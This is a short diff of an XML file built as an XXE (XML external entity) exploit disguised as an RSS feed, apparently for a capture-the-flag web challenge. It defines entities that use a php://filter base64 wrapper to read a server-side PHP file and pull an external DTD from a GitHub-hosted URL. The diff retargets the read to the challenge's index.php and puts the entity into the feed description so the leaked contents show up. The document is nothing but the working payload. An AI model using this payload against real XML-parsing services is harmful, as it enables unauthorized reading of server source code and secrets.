@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE roottag [ 
- <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=http://php.net/manual/en/wrappers.php">
+ <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/challenge/web-serveur/ch29/index.php">
  <!ENTITY % start SYSTEM "<![CDATA["> 
  <!ENTITY % end SYSTEM "]]>">
  <!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/pszot/publicscripts/master/external.dtd">
@@ -10,7 +10,7 @@
 <channel>
   <title>W3Schools Home Page</title>
   <link>http://www.w3schools.com/xml/xml_rss.asp</link>
-  <description>Free web building tutorials</description>
+  <description>&all;</description>
   <item>
     <title>VALID TEXT: &all;</title>
     <link>http://www.w3schools.com/xml/xml_rss.asp</link>
